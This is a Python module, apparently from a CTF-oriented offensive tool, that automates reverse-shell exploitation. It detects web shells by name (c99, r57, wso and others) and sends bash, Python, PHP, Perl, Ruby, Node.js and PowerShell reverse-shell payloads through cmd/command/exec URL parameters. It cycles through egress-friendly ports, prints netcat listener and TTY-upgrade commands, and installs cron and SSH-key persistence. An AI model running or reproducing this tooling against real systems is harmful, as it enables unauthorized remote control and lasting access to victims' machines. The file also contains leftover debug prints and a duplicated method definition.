"""
Auto Mode - Automated exploitation with progress display
"""
import time
import requests
import subprocess
import shutil

from typing import Optional, Dict
from learnshells.utils.logger import Logger
from learnshells.core.detector import TargetDetector, VulnerabilityDetector
from learnshells.core.interface_detector import InterfaceDetector
from learnshells.core.port_tester import PortTester
from learnshells.core.payload_selector import PayloadSelector
from learnshells.core.connectivity_tester import ConnectivityTester
from learnshells.generators import get_generator
from learnshells.listeners import get_listener
from learnshells.stabilizers.tty_upgrade import TTYUpgrader
from learnshells.stabilizers.persistence import PersistenceManager


class AutoMode:
    """
    Auto Mode - Automated exploitation.
    
    Perfect for regular CTF players who know the basics.
    Automates most steps while showing progress.
    """
    
    def __init__(self, logger: Logger = None):
        """
        Initialize Auto Mode.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger(educational=False, verbose=False)
        self.target_url = None
        self.target_info = {}
        self.vpn_ip = None
        self.selected_port = None
        self.payload = None
        self.success = False
        
        # Initialize components
        self.target_detector = TargetDetector(self.logger)
        self.vuln_detector = VulnerabilityDetector(self.logger)
        self.interface_detector = InterfaceDetector(self.logger)
        self.port_tester = PortTester(self.logger)
        self.payload_selector = PayloadSelector(self.logger)
        self.connectivity_tester = ConnectivityTester(self.logger)
        self.tty_upgrader = TTYUpgrader(self.logger)
        self.persistence_manager = PersistenceManager(self.logger)
    
    def run(
        self,
        target_url: str = None,
        target_ip: str = None,
        port: int = None,
        auto_upgrade: bool = True,
        auto_persistence: bool = True,
        monitor: bool = False
    ):
#here
        """
        Run Auto Mode workflow.
        
        Args:
            target_url: Target URL
            auto_upgrade: Automatically upgrade TTY
            auto_persistence: Automatically install persistence
            monitor: Monitor shell health
        """
        self.logger.banner("""
    ___         __           __  __          __     
   /   | __  __/ /_____     /  |/  /___  ___/ /__   
  / /| |/ / / / __/ __ \\   / /|_/ / __ \\/ __  / _ \\  
 / ___ / /_/ / /_/ /_/ /  / /  / / /_/ / /_/ /  __/  
/_/  |_\\__,_/\\__/\\____/  /_/  /_/\\____/\\__,_/\\___/   
                                                      
        ⚡ Automated Exploitation
        """)
        
        self.target_url = target_url
        
        self.logger.info(f"Target: {target_url}")
        self.logger.info("Mode: Automated")
        self.logger.separator()
#here
        try:
            if target_url and self._is_webshell(target_url):
                self.logger.success("🚀 Web shell detected! Fast tracking...")
                self._exploit_webshell(port or 4444)
                return
            # Step 1: VPN Detection
            if not self._detect_vpn():
                return
            
            # Step 2: Target Scanning
            print("Before scan_target")
            self._scan_target()
            print("After scan_target")
            
            # Step 3: Vulnerability Detection
            if not self._detect_vulnerabilities():
                return
            
            # Step 4: Connectivity Testing
            self._test_connectivity()
            
            # Step 5: Port Selection
            self._select_port()
            
            # Step 6: Payload Generation
            self._generate_payload()
            
            # Step 7: Listener Setup
            self._setup_listener()
            
            # Step 8: Exploitation
            self._exploit()
            
            # Step 9: Post-Exploitation
            if self.success:
                if auto_upgrade:
                    self._auto_upgrade_tty()
                
                if auto_persistence:
                    self._auto_install_persistence()
                
                if monitor:
                    self._start_monitoring()
            
            # Summary
            self._display_summary()
            
        except KeyboardInterrupt:
            self.logger.warning("\nAuto mode interrupted by user")
        except Exception as e:
            self.logger.error(f"Auto mode failed: {e}")
            import traceback
            traceback.print_exc()  # ADD THIS LINE
    
    def _detect_vpn(self) -> bool:
        """Detect VPN connection."""
        self.logger.loading("Detecting VPN interface")
        
        vpn_interface = self.interface_detector.detect_vpn_interface()
        
        if not vpn_interface:
            self.logger.error("No VPN detected - cannot continue")
            return False
        
        self.vpn_ip = self.interface_detector.vpn_ip
        self.logger.success(f"VPN: {vpn_interface} ({self.vpn_ip})")
        
        return True
    
# ========== DEBUG SECTION - Remove when done ==========
# ========== DEBUG SECTION - Remove when done ==========
    def _scan_target(self):
        """Scan target for information."""
        print("DEBUG: Starting _scan_target")
        self.logger.loading("Scanning target")
        print("DEBUG: After loading")
        
        print(f"DEBUG: target_detector type: {type(self.target_detector)}")
        print(f"DEBUG: probe_target type: {type(self.target_detector.probe_target)}")
        print(f"DEBUG: target_url type: {type(self.target_url)}")
        print(f"DEBUG: target_url value: {self.target_url}")
        
        print("DEBUG: About to call probe_target")
        try:
            self.target_info = self.target_detector.probe_target(self.target_url)
            print("DEBUG: After probe_target")
        except Exception as e:
            print(f"DEBUG: Exception in probe_target: {e}")
            import traceback
            traceback.print_exc()
            raise
        
        self.logger.success(
            f"Target OS: {self.target_info['os'].upper()}, "
            f"Server: {self.target_info['web_server']}"
        )
        print("DEBUG: End of _scan_target")
# ========== END DEBUG SECTION ==========
# ========== END DEBUG SECTION ==========
    def _detect_vulnerabilities(self) -> bool:
        """Detect vulnerabilities."""
        self.logger.loading("Testing for vulnerabilities")
        
        vulns = self.vuln_detector.detect_vulnerabilities(self.target_url)
        
        if not vulns:
            self.logger.warning("No vulnerabilities detected automatically")
            self.logger.info("You may need to manually identify exploitation path")
            return False
        
        self.logger.success(f"Found {len(vulns)} vulnerabilities")
        for vuln in vulns:
            self.logger.list_item(f"{vuln['type']} in '{vuln.get('parameter', 'N/A')}'")
        
        return True
    
    def _test_connectivity(self):
        """Test connectivity to target."""
        self.logger.loading("Testing connectivity")
        
        target_ip = self.target_info.get('ip')
        
        if target_ip:
            results = self.connectivity_tester.test_full_connectivity(
                self.vpn_ip,
                target_ip,
                443
            )
            
            if results['tests'].get('target_reachable'):
                self.logger.success("Target reachable")
            else:
                self.logger.warning("Target not responding to ping (may still work)")
    
    def _select_port(self):
        """Select optimal port."""
        self.logger.loading("Selecting port")
        
        self.port_tester.test_common_ports()
        self.selected_port = self.port_tester.find_best_port()
        
        self.logger.success(f"Selected port: {self.selected_port}")
    
# ========== EXPLOIT WEBSHELL METHOD - FIXED ==========
    def _exploit_webshell(self, port: int = 4444):
        """Exploit detected web shell."""
        from learnshells.generators.base import PayloadConfig
        
        # Get VPN
        if not self._detect_vpn():
            return
        
        self.selected_port = port
        self.logger.success(f"Using port: {self.selected_port}")
        
        # Generate payload
        self.logger.loading("Generating payload")
        config = PayloadConfig(lhost=self.vpn_ip, lport=self.selected_port)
        generator = get_generator('bash')(config)
        self.payload = generator.generate()
        self.logger.success("Payload generated")
        
        # Start listener
        self.logger.info("Open another terminal and run:")
        self.logger.command(f"nc -lvnp {self.selected_port}")
        input("\n⏳ Press Enter when listener is ready...")
        
        # Send payload
        self.logger.loading("Sending payload to web shell")
        
        try:
            param_names = ['cmd', 'command', 'exec']
            
            for param in param_names:
                try:
                    if '?' in self.target_url:
                        url = f"{self.target_url}&{param}={requests.utils.quote(self.payload)}"
                    else:
                        url = f"{self.target_url}?{param}={requests.utils.quote(self.payload)}"
                    
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        break
                except:
                    continue
            
            time.sleep(2)
            self.logger.success("✓ Payload executed!")
            self.logger.info("\n💡 Check your listener for the shell!")
            input("\n⏳ Press Enter when done...")
            
        except Exception as e:
            self.logger.error(f"Failed: {e}")
# ========== END EXPLOIT WEBSHELL METHOD ==========
    def _setup_listener(self):
        """Setup listener."""
        self.logger.loading("Setting up listener")
        
        self.logger.info("Start listener in another terminal:")
        self.logger.command(f"nc -lvnp {self.selected_port}")
        self.logger.warning("Keep that terminal open!")
        
        # Wait for user confirmation
        input("\nPress Enter when listener is ready...")
    
    def _exploit(self):
        """Execute exploitation."""
        self.logger.loading("Delivering payload")
        
        self.logger.info("Payload:")
        self.logger.code_block(self.payload)
        
        self.logger.info("\nInject this payload through the vulnerability")
        self.logger.tip("For command injection: Add to vulnerable parameter")
        
        if self.logger.confirm("\nPayload delivered successfully?"):
            self.success = True
            self.logger.shell_connected(self.target_url)
        else:
            self.success = False
            self.logger.error("Exploitation failed")
    
    def _auto_upgrade_tty(self):
        """Automatically upgrade TTY."""
        self.logger.loading("Upgrading shell to full TTY")
        
        self.logger.info("Run these commands in your shell:")
        
        commands = self.tty_upgrader.get_upgrade_commands('python3')
        
        self.logger.numbered_item(1, "Spawn PTY:")
        self.logger.command(commands['step1_spawn'])
        
        self.logger.numbered_item(2, "Background (Ctrl+Z), then:")
        self.logger.command(commands['step3_configure'])
        
        self.logger.numbered_item(3, "Set terminal type:")
        self.logger.command(commands['step4_term'])
        
        self.logger.success("TTY upgrade instructions provided")
    
    def _auto_install_persistence(self):
        """Automatically install persistence."""
        self.logger.loading("Installing persistence")
        
        # Generate cron job
        cron_info = self.persistence_manager.generate_cron_job(
            self.vpn_ip,
            self.selected_port
        )
        
        self.logger.info("Install persistence with:")
        self.logger.command(cron_info['commands']['install_user'])
        
        # Generate SSH key backup
        ssh_info = self.persistence_manager.generate_ssh_key()
        
        self.logger.info("\nOptional SSH key backup:")
        self.logger.command(ssh_info['commands']['generate'])
        self.logger.command(ssh_info['commands']['add_key'])
        
        self.logger.success("Persistence methods generated")
    
    def _start_monitoring(self):
        """Start shell monitoring."""
        self.logger.info("Shell monitoring available")
        self.logger.info("Use: learnshells monitor")
    
    def _display_summary(self):
        """Display execution summary."""
        self.logger.separator()
        self.logger.info("Execution Summary", style=Colors.header)
        
        summary = {
            "Target": self.target_url,
            "VPN IP": self.vpn_ip,
            "Target OS": self.target_info.get('os', 'unknown').upper(),
            "Selected Port": self.selected_port,
            "Payload Type": "Generated",
            "Status": "Success ✓" if self.success else "Failed ✗"
        }
        
        self.logger.summary("Auto Mode Results", summary)
        
        if self.success:
            self.logger.success("\n🎉 Shell obtained successfully!")
            self.logger.info("Next steps:")
            self.logger.list_item("1. Upgrade TTY (commands shown above)")
            self.logger.list_item("2. Install persistence")
            self.logger.list_item("3. Enumerate system")
            self.logger.list_item("4. Privilege escalation")
        else:
            self.logger.warning("\n⚠ Exploitation unsuccessful")
            self.logger.info("Troubleshooting:")
            self.logger.list_item("• Verify vulnerability exists")
            self.logger.list_item("• Check firewall/egress filtering")
            self.logger.list_item("• Try different payload type")
            self.logger.list_item("• Verify listener is running")

# ========== WEB SHELL EXPLOITATION METHODS ==========
    def _is_webshell(self, url: str) -> bool:
        """Detect if URL is a web shell."""
        webshell_indicators = [
            'phpbash', 'webshell', 'shell.php', 'cmd.php',
            'c99', 'r57', 'wso', 'b374k', 'backdoor',
        ]
        
        url_lower = url.lower()
        for indicator in webshell_indicators:
            if indicator in url_lower:
                self.logger.info(f"✓ Detected: {indicator}")
                return True
        
        if 'cmd=' in url_lower or 'command=' in url_lower:
            return True
        
        return False
    
    def _exploit_webshell(self, port: int = 4444):
        """Exploit detected web shell."""
        from learnshells.generators.base import PayloadConfig 
        # Get VPN
        if not self._detect_vpn():
            return
        # Try multiple ports with user confirmation
        if self._try_multiple_ports():
            self.logger.shell_connected(self.target_url)
            self.logger.info("\n💡 Stabilize your shell with:")
            self.logger.command("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
            self.logger.command("Ctrl+Z")
            self.logger.command("stty raw -echo; fg")
            self.logger.command("export TERM=xterm")
            input("\n⏳ Press Enter when done...")
        else:
            self.logger.warning("Could not establish reverse shell")
        

# ========== END WEB SHELL METHODS ==========
# ========== SMART PORT AND PAYLOAD TESTING ==========
    def _try_multiple_ports(self):
        """Try all payloads on default port, then offer to try other ports."""
        from learnshells.generators.base import PayloadConfig
        
        # All available payload types
        payload_types = [
            ('bash', 'Bash reverse shell'),
            ('python', 'Python reverse shell'),
            ('php', 'PHP reverse shell'),
            ('perl', 'Perl reverse shell'),
            ('ruby', 'Ruby reverse shell'),
            ('nodejs', 'Node.js reverse shell'),
            ('powershell', 'PowerShell reverse shell'),
        ]
        
        # Alternative ports to try if default fails
        alternative_ports = [
            (443, "HTTPS - rarely blocked"),
            (80, "HTTP - rarely blocked"), 
            (53, "DNS - rarely blocked"),
            (8080, "HTTP-Alt"),
            (9001, "Alternative port"),
        ]
        
        # Start with default port 4444
        current_port = 4444
        
        while True:
            self.logger.info(f"\n🔄 Testing port {current_port}")
            
            # Listener instructions
            if current_port < 1024:
                self.logger.info(f"In another terminal: sudo nc -lvnp {current_port}")
            else:
                self.logger.info(f"In another terminal: nc -lvnp {current_port}")
            
            input(f"⏳ Press Enter when listener is ready on port {current_port}...")
            
            # Try all payloads on this port
            for payload_type, payload_desc in payload_types:
                self.logger.info(f"\n  📦 Trying {payload_desc}...")
                
                try:
                    # Generate payload
                    config = PayloadConfig(lhost=self.vpn_ip, lport=current_port)
                    generator = get_generator(payload_type)(config)
                    payload = generator.generate()
                    
                    # Send payload
                    self.logger.loading(f"Sending {payload_type} payload")
                    send_success = self._send_payload_to_webshell(payload)
                    
                    if send_success:
                        self.logger.success(f"✓ {payload_type.title()} payload sent (HTTP 200)")
                        time.sleep(3)  # Give shell time to connect
                        
                        # Ask user if they got the shell
                        if self.logger.confirm(f"💡 Did you receive a shell with {payload_type}?"):
                            # Success!
                            self.selected_port = current_port
                            self.payload = payload
                            self.success = True
                            self.logger.success(f"🎉 Shell confirmed! ({payload_type} on port {current_port})")
                            return True
                        else:
                            self.logger.warning(f"  ⚠ No shell with {payload_type}, trying next payload...")
                    else:
                        self.logger.error(f"  ✗ Failed to send {payload_type} payload")
                        
                except Exception as e:
                    self.logger.error(f"  ✗ Error with {payload_type}: {e}")
                    continue
            
            # All payloads failed on this port
            self.logger.warning(f"\n⚠ No payloads worked on port {current_port}")
            
            # Ask user if they want to try another port
            if not self.logger.confirm("🔄 Try a different port?"):
                self.logger.info("❌ User cancelled. Exploitation stopped.")
                return False
            
            # Show available ports
            self.logger.info("\n📋 Available ports:")
            for i, (port, desc) in enumerate(alternative_ports, 1):
                self.logger.list_item(f"{i}. Port {port} - {desc}")
            self.logger.list_item("0. Custom port")
            
            # Get user choice
            choice = self.logger.prompt("Select port number", default="1")
            
            try:
                choice_int = int(choice)
                if choice_int == 0:
                    # Custom port
                    custom_port = self.logger.prompt("Enter custom port", default="4444")
                    current_port = int(custom_port)
                elif 1 <= choice_int <= len(alternative_ports):
                    # Selected from list
                    current_port = alternative_ports[choice_int - 1][0]
                    # Remove from alternatives so we don't offer it again
                    alternative_ports.pop(choice_int - 1)
                else:
                    self.logger.warning("Invalid choice, using 443")
                    current_port = 443
            except ValueError:
                self.logger.warning("Invalid input, using 443")
                current_port = 443
        
        # Should never reach here
        return False
# ========== END SMART PORT AND PAYLOAD TESTING ==========
# ========== SEND PAYLOAD TO WEBSHELL ==========
    def _send_payload_to_webshell(self, payload: str) -> bool:
        """Send a payload to the web shell."""
        try:
            param_names = ['cmd', 'command', 'exec']
            
            for param in param_names:
                try:
                    if '?' in self.target_url:
                        url = f"{self.target_url}&{param}={requests.utils.quote(payload)}"
                    else:
                        url = f"{self.target_url}?{param}={requests.utils.quote(payload)}"
                    
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        return True
                except:
                    continue
            
            return False
        except Exception as e:
            return False
# ========== END SEND PAYLOAD ==========
# ========== GENERATE PAYLOAD METHOD ==========
    def _generate_payload(self):
        """Generate payload automatically."""
        from learnshells.generators.base import PayloadConfig
        
        self.logger.loading("Generating payload")
        
        # Select payload type
        payload_type, reason = self.payload_selector.select_payload_type(
            self.target_info,
            criteria='reliability'
        )
        
        # Generate payload
        config = PayloadConfig(lhost=self.vpn_ip, lport=self.selected_port)
        generator = get_generator(payload_type)(config)
        self.payload = generator.generate()
        
        self.logger.success(f"Generated {payload_type} payload ({len(self.payload)} bytes)")
# ========== END GENERATE PAYLOAD METHOD ==========
